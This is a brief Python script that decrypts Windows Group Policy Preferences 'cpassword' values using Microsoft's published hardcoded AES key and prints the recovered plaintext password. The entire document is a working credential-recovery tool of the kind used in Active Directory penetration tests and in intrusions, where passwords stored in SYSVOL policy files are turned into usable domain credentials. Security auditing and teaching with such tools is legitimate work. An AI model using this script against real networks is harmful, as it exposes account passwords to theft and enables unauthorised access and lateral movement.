import sys
import base64
from Crypto.Cipher import AES

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <GPO_hash>")
    sys.exit()

cpassword = sys.argv[1]

while len(cpassword) % 4 > 0:
    cpassword += "="

decoded_password = base64.b64decode(cpassword)

# Microsoft hardcoded key used to decrypt the GPO hash : https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

# The AES algorithm works on text with length in the multiples of 16 bytes, hence the IV.
aes = AES.new(key, AES.MODE_CBC, b"\00" * 16)
plain_text = aes.decrypt(decoded_password).strip()

print(f"Decrypted password : {plain_text.decode('utf-8')}")
